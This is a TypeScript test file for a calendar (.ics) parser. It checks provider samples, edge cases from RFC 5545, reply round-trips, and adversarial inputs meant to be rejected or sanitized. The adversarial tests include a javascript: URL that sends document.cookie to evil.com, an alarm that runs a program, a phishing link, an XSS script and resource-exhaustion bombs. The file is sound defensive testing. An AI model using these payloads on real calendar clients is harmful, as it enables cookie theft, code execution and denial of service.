import { describe, it, expect } from "vitest";
import ICAL from "ical.js";
import { parseIcs } from "../../../src/processor/calendar/ics-parser.js";
import { buildReplyIcs } from "../../../src/processor/calendar/ics-builder.js";

function toBytes(str: string): Uint8Array {
  return new TextEncoder().encode(str);
}

const MAX_FILE_SIZE = 1_048_576; // 1 MB — mirrors the limit in ics-parser.ts

// ---------------------------------------------------------------------------
// Real-world .ics fixtures — Google Calendar, Outlook, Apple Calendar
// Validates: Requirement 19.3
// ---------------------------------------------------------------------------

/**
 * Google Calendar uses PRODID:-//Google Inc//Google Calendar 70.9054//EN,
 * includes X-GOOGLE-* properties, and typically has METHOD:REQUEST at the
 * VCALENDAR level with a single VEVENT.
 */
const GOOGLE_CALENDAR_ICS = [
  "BEGIN:VCALENDAR",
  "PRODID:-//Google Inc//Google Calendar 70.9054//EN",
  "VERSION:2.0",
  "CALSCALE:GREGORIAN",
  "METHOD:REQUEST",
  "BEGIN:VTIMEZONE",
  "TZID:America/New_York",
  "BEGIN:STANDARD",
  "DTSTART:19701101T020000",
  "RRULE:FREQ=YEARLY;BYMONTH=11;BYDAY=1SU",
  "TZOFFSETFROM:-0400",
  "TZOFFSETTO:-0500",
  "TZNAME:EST",
  "END:STANDARD",
  "BEGIN:DAYLIGHT",
  "DTSTART:19700308T020000",
  "RRULE:FREQ=YEARLY;BYMONTH=3;BYDAY=2SU",
  "TZOFFSETFROM:-0500",
  "TZOFFSETTO:-0400",
  "TZNAME:EDT",
  "END:DAYLIGHT",
  "END:VTIMEZONE",
  "BEGIN:VEVENT",
  "DTSTART;TZID=America/New_York:20250415T100000",
  "DTEND;TZID=America/New_York:20250415T110000",
  "DTSTAMP:20250401T120000Z",
  "ORGANIZER;CN=Alice Johnson:mailto:alice@company.com",
  "UID:040000008200E00074C5B7101A82E00800000000B0A52E17@google.com",
  "ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;",
  " RSVP=TRUE;CN=Bob Smith;X-NUM-GUESTS=0:mailto:bob@example.com",
  "CREATED:20250401T100000Z",
  "DESCRIPTION:Weekly team sync\\nDial-in: https://meet.google.com/abc-defg-hij",
  "LAST-MODIFIED:20250401T100000Z",
  "LOCATION:Conference Room A",
  "SEQUENCE:0",
  "STATUS:CONFIRMED",
  "SUMMARY:Weekly Team Sync",
  "TRANSP:OPAQUE",
  "X-GOOGLE-CONFERENCE:https://meet.google.com/abc-defg-hij",
  "END:VEVENT",
  "END:VCALENDAR",
].join("\r\n");

/**
 * Microsoft Outlook uses PRODID:-//Microsoft Corporation//Outlook 16.0 MIMEDIR//EN,
 * includes X-MICROSOFT-* properties, uses BUSYSTATUS instead of TRANSP,
 * and often includes X-MS-OLK-FORCEINSPECTOROPEN.
 */
const OUTLOOK_ICS = [
  "BEGIN:VCALENDAR",
  "PRODID:-//Microsoft Corporation//Outlook 16.0 MIMEDIR//EN",
  "VERSION:2.0",
  "METHOD:REQUEST",
  "X-MS-OLK-FORCEINSPECTOROPEN:TRUE",
  "BEGIN:VTIMEZONE",
  "TZID:GMT Standard Time",
  "BEGIN:STANDARD",
  "DTSTART:16011028T020000",
  "RRULE:FREQ=YEARLY;BYDAY=-1SU;BYMONTH=10",
  "TZOFFSETFROM:+0100",
  "TZOFFSETTO:+0000",
  "END:STANDARD",
  "BEGIN:DAYLIGHT",
  "DTSTART:16010325T010000",
  "RRULE:FREQ=YEARLY;BYDAY=-1SU;BYMONTH=3",
  "TZOFFSETFROM:+0000",
  "TZOFFSETTO:+0100",
  "END:DAYLIGHT",
  "END:VTIMEZONE",
  "BEGIN:VEVENT",
  "ATTENDEE;CN=Charlie Davis;RSVP=TRUE;PARTSTAT=NEEDS-ACTION;",
  " ROLE=REQ-PARTICIPANT:mailto:charlie@example.com",
  "CLASS:PUBLIC",
  "CREATED:20250402T090000Z",
  "DESCRIPTION:Q2 Planning Session\\n\\nPlease review the attached deck.",
  "DTEND;TZID=GMT Standard Time:20250420T160000",
  "DTSTAMP:20250402T090000Z",
  "DTSTART;TZID=GMT Standard Time:20250420T140000",
  "LAST-MODIFIED:20250402T090000Z",
  "LOCATION:Teams Meeting - https://teams.microsoft.com/l/meetup-join/abc123",
  "ORGANIZER;CN=David Wilson:mailto:david@bigcorp.com",
  "PRIORITY:5",
  "SEQUENCE:2",
  "SUMMARY:Q2 Planning",
  "TRANSP:OPAQUE",
  "UID:040000008200E00074C5B7101A82E008000000001234ABCD@outlook.com",
  "X-MICROSOFT-CDO-BUSYSTATUS:BUSY",
  "X-MICROSOFT-CDO-IMPORTANCE:1",
  "X-MICROSOFT-DISALLOW-COUNTER:FALSE",
  "END:VEVENT",
  "END:VCALENDAR",
].join("\r\n");

/**
 * Apple Calendar uses PRODID:-//Apple Inc.//Mac OS X 14.3//EN,
 * includes X-APPLE-* properties, uses VALARM for default reminders,
 * and often includes ATTACH for rich content.
 */
const APPLE_CALENDAR_ICS = [
  "BEGIN:VCALENDAR",
  "VERSION:2.0",
  "PRODID:-//Apple Inc.//Mac OS X 14.3//EN",
  "CALSCALE:GREGORIAN",
  "METHOD:REQUEST",
  "BEGIN:VTIMEZONE",
  "TZID:Europe/London",
  "BEGIN:DAYLIGHT",
  "TZOFFSETFROM:+0000",
  "RRULE:FREQ=YEARLY;BYMONTH=3;BYDAY=-1SU",
  "DTSTART:19700329T010000",
  "TZNAME:BST",
  "TZOFFSETTO:+0100",
  "END:DAYLIGHT",
  "BEGIN:STANDARD",
  "TZOFFSETFROM:+0100",
  "RRULE:FREQ=YEARLY;BYMONTH=10;BYDAY=-1SU",
  "DTSTART:19701025T020000",
  "TZNAME:GMT",
  "TZOFFSETTO:+0000",
  "END:STANDARD",
  "END:VTIMEZONE",
  "BEGIN:VEVENT",
  "CREATED:20250403T080000Z",
  "UID:E3A2B1C4-5D6E-7F8A-9B0C-1D2E3F4A5B6C",
  "DTEND;TZID=Europe/London:20250425T130000",
  "TRANSP:OPAQUE",
  "X-APPLE-TRAVEL-ADVISORY-BEHAVIOR:AUTOMATIC",
  "SUMMARY:Design Review",
  "DTSTART;TZID=Europe/London:20250425T110000",
  "DTSTAMP:20250403T080000Z",
  "LOCATION:Apple Park\\, Cupertino",
  "SEQUENCE:1",
  "ORGANIZER;CN=Eve Martinez:mailto:eve@startup.io",
  "ATTENDEE;CN=Frank Lee;PARTSTAT=NEEDS-ACTION;RSVP=TRUE;",
  " ROLE=REQ-PARTICIPANT:mailto:frank@example.com",
  "DESCRIPTION:Review the new design mockups for v2.0 launch.",
  "STATUS:CONFIRMED",
  "BEGIN:VALARM",
  "X-WR-ALARMUID:A1B2C3D4-E5F6-7890-ABCD-EF1234567890",
  "UID:A1B2C3D4-E5F6-7890-ABCD-EF1234567890",
  "TRIGGER:-PT15M",
  "ATTACH;VALUE=URI:Basso",
  "ACTION:AUDIO",
  "END:VALARM",
  "BEGIN:VALARM",
  "X-WR-ALARMUID:B2C3D4E5-F6A7-8901-BCDE-F12345678901",
  "UID:B2C3D4E5-F6A7-8901-BCDE-F12345678901",
  "TRIGGER:-PT1H",
  "ACTION:DISPLAY",
  "DESCRIPTION:Event reminder",
  "END:VALARM",
  "END:VEVENT",
  "END:VCALENDAR",
].join("\r\n");

// ---------------------------------------------------------------------------
// Requirement 19.3: Parse real-world .ics from Google, Outlook, Apple
// ---------------------------------------------------------------------------

describe("ICS conformance — real-world calendar provider samples", () => {
  it.each([
    {
      provider: "Google Calendar",
      ics: GOOGLE_CALENDAR_ICS,
      expectedTitle: "Weekly Team Sync",
      expectedOrganizer: "alice@company.com",
      expectedOrganizerCn: "Alice Johnson",
      expectedUid: "040000008200E00074C5B7101A82E00800000000B0A52E17@google.com",
      expectedMethod: "REQUEST",
      expectedSequence: 0,
      expectedLocation: "Conference Room A",
      expectedStatus: "CONFIRMED",
      reason: "Google uses X-GOOGLE-* props, TZID references, and long UIDs",
    },
    {
      provider: "Microsoft Outlook",
      ics: OUTLOOK_ICS,
      expectedTitle: "Q2 Planning",
      expectedOrganizer: "david@bigcorp.com",
      expectedOrganizerCn: "David Wilson",
      expectedUid: "040000008200E00074C5B7101A82E008000000001234ABCD@outlook.com",
      expectedMethod: "REQUEST",
      expectedSequence: 2,
      expectedLocation: "Teams Meeting - https://teams.microsoft.com/l/meetup-join/abc123",
      expectedStatus: undefined,
      reason: "Outlook uses X-MICROSOFT-* props, CLASS, PRIORITY, and BUSYSTATUS",
    },
    {
      provider: "Apple Calendar",
      ics: APPLE_CALENDAR_ICS,
      expectedTitle: "Design Review",
      expectedOrganizer: "eve@startup.io",
      expectedOrganizerCn: "Eve Martinez",
      expectedUid: "E3A2B1C4-5D6E-7F8A-9B0C-1D2E3F4A5B6C",
      expectedMethod: "REQUEST",
      expectedSequence: 1,
      expectedLocation: "Apple Park, Cupertino",
      expectedStatus: "CONFIRMED",
      reason: "Apple uses UUID-style UIDs, VALARM with X-WR-ALARMUID, and X-APPLE-* props",
    },
  ])("$provider: parses correctly — $reason", ({
    ics, expectedTitle, expectedOrganizer, expectedOrganizerCn,
    expectedUid, expectedMethod, expectedSequence, expectedLocation, expectedStatus,
  }) => {
    const result = parseIcs(toBytes(ics));

    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();

    expect(calendarData.title).toBe(expectedTitle);
    expect(calendarData.organizer).toBe(expectedOrganizer);
    expect(calendarData.organizerCn).toBe(expectedOrganizerCn);
    expect(calendarData.veventUid).toBe(expectedUid);
    expect(calendarData.method).toBe(expectedMethod);
    expect(calendarData.sequence).toBe(expectedSequence);
    if (expectedLocation !== undefined) {
      expect(calendarData.location).toBe(expectedLocation);
    }
    if (expectedStatus !== undefined) {
      expect(calendarData.status).toBe(expectedStatus);
    }
  });

  it("Apple Calendar: VALARM components are stripped during parsing", () => {
    const result = parseIcs(toBytes(APPLE_CALENDAR_ICS));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();

    // CalendarEventData has no alarm-related fields — structural guarantee
    expect(Object.keys(calendarData)).not.toContain("valarm");
    expect(Object.keys(calendarData)).not.toContain("alarm");
  });

  it("Google Calendar: X-GOOGLE-CONFERENCE preserved as x-property", () => {
    const result = parseIcs(toBytes(GOOGLE_CALENDAR_ICS));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();

    expect(calendarData.xProperties).toBeDefined();
    expect(calendarData.xProperties!["X-GOOGLE-CONFERENCE"]).toBe(
      "https://meet.google.com/abc-defg-hij"
    );
  });

  it("Outlook: X-MICROSOFT-CDO-BUSYSTATUS preserved as x-property", () => {
    const result = parseIcs(toBytes(OUTLOOK_ICS));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();

    expect(calendarData.xProperties).toBeDefined();
    expect(calendarData.xProperties!["X-MICROSOFT-CDO-BUSYSTATUS"]).toBe("BUSY");
  });

  it("Google Calendar: attendees parsed with CN and PARTSTAT", () => {
    const result = parseIcs(toBytes(GOOGLE_CALENDAR_ICS));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();

    expect(calendarData.attendees).toHaveLength(1);
    expect(calendarData.attendees[0]).toEqual(expect.objectContaining({
      address: "bob@example.com",
      cn: "Bob Smith",
      partstat: "NEEDS-ACTION",
      role: "REQ-PARTICIPANT",
    }));
  });
});

// ---------------------------------------------------------------------------
// Requirement 19.1: Validate against ical.js for RFC 5545 edge cases
// ---------------------------------------------------------------------------

describe("ICS conformance — RFC 5545 edge cases via ical.js", () => {
  it("handles RRULE with complex recurrence pattern", () => {
    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Test//Test//EN",
      "METHOD:REQUEST",
      "BEGIN:VEVENT",
      "UID:rrule-edge-case-001",
      "DTSTART:20250101T090000Z",
      "DTEND:20250101T100000Z",
      "SUMMARY:Recurring Event",
      "ORGANIZER:mailto:org@example.com",
      "RRULE:FREQ=MONTHLY;BYDAY=2MO;COUNT=12",
      "SEQUENCE:0",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();
    // ical.js may reorder RRULE parts — verify all parts are present
    expect(calendarData.recurrenceRule).toContain("FREQ=MONTHLY");
    expect(calendarData.recurrenceRule).toContain("BYDAY=2MO");
    expect(calendarData.recurrenceRule).toContain("COUNT=12");
  });

  it("handles RECURRENCE-ID for exception to recurring event", () => {
    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Test//Test//EN",
      "METHOD:REQUEST",
      "BEGIN:VEVENT",
      "UID:recurrence-exception-001",
      "DTSTART:20250315T090000Z",
      "DTEND:20250315T100000Z",
      "SUMMARY:Rescheduled Instance",
      "ORGANIZER:mailto:org@example.com",
      "RECURRENCE-ID:20250301T090000Z",
      "SEQUENCE:1",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();
    expect(calendarData.recurrenceId).toBeDefined();
    // The recurrence-id should be an ISO 8601 string
    expect(calendarData.recurrenceId).toContain("2025-03-01");
  });

  it("handles METHOD:CANCEL with STATUS:CANCELLED", () => {
    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Test//Test//EN",
      "METHOD:CANCEL",
      "BEGIN:VEVENT",
      "UID:cancel-event-001",
      "DTSTART:20250415T100000Z",
      "DTEND:20250415T110000Z",
      "SUMMARY:Cancelled Meeting",
      "ORGANIZER:mailto:org@example.com",
      "STATUS:CANCELLED",
      "SEQUENCE:3",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();
    expect(calendarData.method).toBe("CANCEL");
    expect(calendarData.status).toBe("CANCELLED");
    expect(calendarData.sequence).toBe(3);
  });

  it("handles all-day event (DATE value type without time)", () => {
    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Test//Test//EN",
      "METHOD:REQUEST",
      "BEGIN:VEVENT",
      "UID:all-day-event-001",
      "DTSTART;VALUE=DATE:20250501",
      "DTEND;VALUE=DATE:20250502",
      "SUMMARY:Company Holiday",
      "ORGANIZER:mailto:hr@company.com",
      "SEQUENCE:0",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();
    expect(calendarData.title).toBe("Company Holiday");
    // All-day events still produce a startTime
    expect(calendarData.startTime).toBeDefined();
    expect(calendarData.startTime.length).toBeGreaterThan(0);
  });

  it("handles multi-byte UTF-8 characters in SUMMARY and DESCRIPTION", () => {
    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Test//Test//EN",
      "METHOD:REQUEST",
      "BEGIN:VEVENT",
      "UID:utf8-event-001",
      "DTSTART:20250601T100000Z",
      "DTEND:20250601T110000Z",
      "SUMMARY:会議 — Design Review 🎨",
      "DESCRIPTION:Ñoño café résumé naïve",
      "ORGANIZER:mailto:org@example.com",
      "SEQUENCE:0",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();
    expect(calendarData.title).toBe("会議 — Design Review 🎨");
    expect(calendarData.description).toBe("Ñoño café résumé naïve");
  });

  it("handles folded lines (RFC 5545 §3.1 line unfolding)", () => {
    // RFC 5545 allows long lines to be folded with CRLF + space/tab
    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Test//Test//EN",
      "METHOD:REQUEST",
      "BEGIN:VEVENT",
      "UID:folded-line-001",
      "DTSTART:20250701T100000Z",
      "DTEND:20250701T110000Z",
      "SUMMARY:This is a very long summary that has been folded across multiple",
      " lines according to RFC 5545 line folding rules",
      "ORGANIZER:mailto:org@example.com",
      "SEQUENCE:0",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();
    expect(calendarData.title).toBe(
      "This is a very long summary that has been folded across multiple" +
      "lines according to RFC 5545 line folding rules"
    );
  });

  it("handles missing optional fields gracefully", () => {
    // Minimal VEVENT with only required fields
    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Test//Test//EN",
      "METHOD:REQUEST",
      "BEGIN:VEVENT",
      "UID:minimal-event-001",
      "DTSTART:20250801T100000Z",
      "ORGANIZER:mailto:org@example.com",
      "SEQUENCE:0",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();
    expect(calendarData.veventUid).toBe("minimal-event-001");
    expect(calendarData.title).toBe("");
    expect(calendarData.endTime).toBeUndefined();
    expect(calendarData.location).toBeUndefined();
    expect(calendarData.description).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// Requirement 19.2: REPLY round-trip — compose → parse back → assert structure
// ---------------------------------------------------------------------------

describe("ICS conformance — REPLY round-trip via ical.js", () => {
  it.each([
    {
      decision: "ACCEPTED" as const,
      veventUid: "original-uid-abc123",
      sequence: 2,
      attendeeAddress: "alias@privacy.example.com",
      organizerAddress: "organizer@company.com",
      reason: "ACCEPTED reply preserves all fields through round-trip",
    },
    {
      decision: "DECLINED" as const,
      veventUid: "event-with-special.chars+tag@domain",
      sequence: 0,
      attendeeAddress: "user-alias@masked.io",
      organizerAddress: "host@calendly.com",
      reason: "DECLINED reply with special chars in UID round-trips correctly",
    },
    {
      decision: "TENTATIVE" as const,
      veventUid: "040000008200E00074C5B7101A82E00800000000ABCDEF@google.com",
      sequence: 5,
      attendeeAddress: "arc-xyz@acc-123.cal.numaeel.com",
      organizerAddress: "alice@bigcorp.com",
      reason: "TENTATIVE reply with Outlook-style UID and high sequence",
    },
  ])("$reason", ({ decision, veventUid, sequence, attendeeAddress, organizerAddress }) => {
    // Compose the REPLY .ics
    const replyIcs = buildReplyIcs({
      veventUid,
      sequence,
      attendeeAddress,
      decision,
      organizerAddress,
    });

    // Parse back through ical.js (the conformance oracle)
    const parsed = ICAL.parse(replyIcs);
    const comp = new ICAL.Component(parsed);

    // Assert VCALENDAR-level properties
    expect(comp.getFirstPropertyValue("method")).toBe("REPLY");
    expect(comp.getFirstPropertyValue("version")).toBe("2.0");

    // Assert VEVENT-level properties
    const vevent = comp.getFirstSubcomponent("vevent");
    expect(vevent).not.toBeNull();

    expect(vevent!.getFirstPropertyValue("uid")).toBe(veventUid);
    expect(vevent!.getFirstPropertyValue("sequence")).toBe(sequence);

    // Assert ORGANIZER
    const organizer = vevent!.getFirstProperty("organizer");
    expect(organizer).not.toBeNull();
    expect(organizer!.getFirstValue()).toBe(`mailto:${organizerAddress}`);

    // Assert ATTENDEE with correct PARTSTAT
    const attendee = vevent!.getFirstProperty("attendee");
    expect(attendee).not.toBeNull();
    expect(attendee!.getFirstValue()).toBe(`mailto:${attendeeAddress}`);
    expect(attendee!.getParameter("partstat")).toBe(decision);
  });

  it("REPLY round-trip: composed output is parseable by parseIcs", () => {
    // Compose a REPLY and verify our own parser can handle it
    const replyIcs = buildReplyIcs({
      veventUid: "roundtrip-test-uid-001",
      sequence: 1,
      attendeeAddress: "alias@privacy.example.com",
      decision: "ACCEPTED",
      organizerAddress: "organizer@company.com",
    });

    // Our parser should handle METHOD:REPLY .ics files
    const result = parseIcs(toBytes(replyIcs));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();

    expect(calendarData.veventUid).toBe("roundtrip-test-uid-001");
    expect(calendarData.sequence).toBe(1);
    expect(calendarData.method).toBe("REPLY");
    expect(calendarData.organizer).toBe("organizer@company.com");
  });
});

// ---------------------------------------------------------------------------
// Requirement 19.4: Adversarial .ics samples
// Tests security limits from Requirement 5
// ---------------------------------------------------------------------------

describe("ICS conformance — adversarial samples", () => {
  it("rejects .ics with payload just over 1 MB boundary", () => {
    // Adversarial: file is exactly 1 byte over the limit
    const headerFooter = [
      "BEGIN:VCALENDAR\r\n",
      "VERSION:2.0\r\n",
      "PRODID:-//Test//Test//EN\r\n",
      "METHOD:REQUEST\r\n",
      "BEGIN:VEVENT\r\n",
      "UID:oversized-adversarial\r\n",
      "DTSTART:20250101T000000Z\r\n",
      "ORGANIZER:mailto:org@example.com\r\n",
      "DESCRIPTION:",
    ].join("");
    const footer = "\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n";
    const overhead = headerFooter.length + footer.length;
    // Pad description to push total just over 1 MB
    const padding = "A".repeat(MAX_FILE_SIZE - overhead + 1);
    const ics = headerFooter + padding + footer;

    expect(toBytes(ics).byteLength).toBeGreaterThan(MAX_FILE_SIZE);
    const result = parseIcs(toBytes(ics));
    expect(result.isErr()).toBe(true);
    expect(result._unsafeUnwrapErr().reason).toBe("File exceeds 1 MB size limit");
  });

  it("rejects VTIMEZONE bomb — 101 timezone definitions", () => {
    // Adversarial: attacker embeds many VTIMEZONE components to exhaust memory
    const timezones = Array.from({ length: 101 }, (_, i) => [
      "BEGIN:VTIMEZONE",
      `TZID:Adversarial/Zone${i}`,
      "BEGIN:STANDARD",
      "DTSTART:19701025T030000",
      "TZOFFSETFROM:+0200",
      "TZOFFSETTO:+0100",
      "TZNAME:ADV",
      "END:STANDARD",
      "END:VTIMEZONE",
    ].join("\r\n")).join("\r\n");

    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Adversarial//Bomb//EN",
      "METHOD:REQUEST",
      timezones,
      "BEGIN:VEVENT",
      "UID:tz-bomb-001",
      "DTSTART:20250101T000000Z",
      "ORGANIZER:mailto:attacker@evil.com",
      "SUMMARY:Innocent Meeting",
      "SEQUENCE:0",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isErr()).toBe(true);
    expect(result._unsafeUnwrapErr().reason).toBe("Suspected VTIMEZONE bomb");
  });

  it("rejects deeply nested components exceeding depth 5", () => {
    // Adversarial: attacker nests components to trigger stack overflow or DoS
    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Adversarial//Nesting//EN",
      "METHOD:REQUEST",
      "BEGIN:VTIMEZONE",
      "TZID:Deep/Nest",
      "BEGIN:STANDARD",
      "DTSTART:19701025T030000",
      "TZOFFSETFROM:+0200",
      "TZOFFSETTO:+0100",
      "BEGIN:X-NEST-1",
      "X-DATA:level4",
      "BEGIN:X-NEST-2",
      "X-DATA:level5",
      "BEGIN:X-NEST-3",
      "X-DATA:level6-exceeds-limit",
      "END:X-NEST-3",
      "END:X-NEST-2",
      "END:X-NEST-1",
      "END:STANDARD",
      "END:VTIMEZONE",
      "BEGIN:VEVENT",
      "UID:deep-nest-adversarial",
      "DTSTART:20250101T000000Z",
      "ORGANIZER:mailto:attacker@evil.com",
      "SUMMARY:Nested Attack",
      "SEQUENCE:0",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isErr()).toBe(true);
    expect(result._unsafeUnwrapErr().reason).toBe("Excessive nesting depth");
  });

  it("truncates excessive attendees to 100 — attacker floods ATTENDEE list", () => {
    // Adversarial: attacker includes 500 attendees to bloat output
    const attendees = Array.from({ length: 500 }, (_, i) =>
      `ATTENDEE;PARTSTAT=NEEDS-ACTION;CN=User ${i}:mailto:user${i}@spam.com`
    ).join("\r\n");

    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Adversarial//Spam//EN",
      "METHOD:REQUEST",
      "BEGIN:VEVENT",
      "UID:attendee-flood-001",
      "DTSTART:20250101T000000Z",
      "DTEND:20250101T010000Z",
      "ORGANIZER:mailto:attacker@evil.com",
      "SUMMARY:Spam Meeting",
      "SEQUENCE:0",
      attendees,
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();
    expect(calendarData.attendees).toHaveLength(100);
  });

  it.each([
    {
      label: "completely garbage binary data",
      ics: "\x00\x01\x02\x03\x04\x05 random binary garbage \xFF\xFE",
      expectedReasonPattern: /^Malformed iCal structure:/,
    },
    {
      label: "HTML disguised as .ics",
      ics: "<html><body><script>alert('xss')</script></body></html>",
      expectedReasonPattern: /^Malformed iCal structure:/,
    },
    {
      label: "JSON payload in .ics extension",
      ics: '{"event": "fake", "method": "REQUEST"}',
      expectedReasonPattern: /^Malformed iCal structure:/,
    },
    {
      label: "VCALENDAR with no content between BEGIN/END",
      ics: "BEGIN:VCALENDAR\r\nVERSION:2.0\r\nEND:VCALENDAR",
      expectedReasonPattern: /no VEVENT component found/,
    },
    {
      label: "truncated mid-property",
      ics: "BEGIN:VCALENDAR\r\nVERSION:2.0\r\nMETHOD:REQUEST\r\nBEGIN:VEVENT\r\nUID:trunc",
      expectedReasonPattern: /^Malformed iCal structure:/,
    },
  ])("rejects malformed input: $label", ({ ics, expectedReasonPattern }) => {
    const result = parseIcs(toBytes(ics));
    expect(result.isErr()).toBe(true);
    expect(result._unsafeUnwrapErr().reason).toMatch(expectedReasonPattern);
  });

  it("handles .ics with VALARM containing ACTION:PROCEDURE (security risk)", () => {
    // Adversarial: ACTION:PROCEDURE can execute arbitrary programs on some clients
    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Adversarial//Procedure//EN",
      "METHOD:REQUEST",
      "BEGIN:VEVENT",
      "UID:procedure-alarm-001",
      "DTSTART:20250101T100000Z",
      "DTEND:20250101T110000Z",
      "ORGANIZER:mailto:attacker@evil.com",
      "SUMMARY:Innocent Meeting",
      "SEQUENCE:0",
      "BEGIN:VALARM",
      "ACTION:PROCEDURE",
      "TRIGGER:-PT0M",
      "ATTACH:file:///usr/bin/malicious",
      "END:VALARM",
      "BEGIN:VALARM",
      "ACTION:EMAIL",
      "TRIGGER:-PT5M",
      "ATTENDEE:mailto:victim@example.com",
      "SUMMARY:Phishing",
      "DESCRIPTION:Click here: https://evil.com/phish",
      "END:VALARM",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();
    // VALARM stripped — no alarm data in output
    expect(Object.keys(calendarData)).not.toContain("valarm");
    expect(calendarData.title).toBe("Innocent Meeting");
  });

  it("handles .ics with malicious URL injection in DESCRIPTION", () => {
    // Adversarial: attacker embeds javascript: URLs in description
    // The parser stores description as-is (it's text), but URL field is sanitized
    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Adversarial//URLInjection//EN",
      "METHOD:REQUEST",
      "BEGIN:VEVENT",
      "UID:url-injection-001",
      "DTSTART:20250101T100000Z",
      "DTEND:20250101T110000Z",
      "ORGANIZER:mailto:attacker@evil.com",
      "SUMMARY:Meeting",
      "URL:javascript:document.location='https://evil.com/steal?c='+document.cookie",
      "SEQUENCE:0",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isOk()).toBe(true);
    const { calendarData } = result._unsafeUnwrap();
    // URL field sanitized to empty string
    expect(calendarData.url).toBe("");
  });

  it("rejects output exceeding 100 KB — attacker uses massive DESCRIPTION", () => {
    // Adversarial: attacker crafts a valid .ics under 1 MB but with content
    // that produces >100 KB of CalendarData JSON
    const longDesc = "DESCRIPTION:" + "B".repeat(105_000);
    const ics = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Adversarial//OutputBomb//EN",
      "METHOD:REQUEST",
      "BEGIN:VEVENT",
      "UID:output-bomb-001",
      "DTSTART:20250101T100000Z",
      "DTEND:20250101T110000Z",
      "ORGANIZER:mailto:attacker@evil.com",
      "SUMMARY:Normal Title",
      longDesc,
      "SEQUENCE:0",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    const result = parseIcs(toBytes(ics));
    expect(result.isErr()).toBe(true);
    expect(result._unsafeUnwrapErr().reason).toBe("Parsed calendar data exceeds 100 KB limit");
  });
});
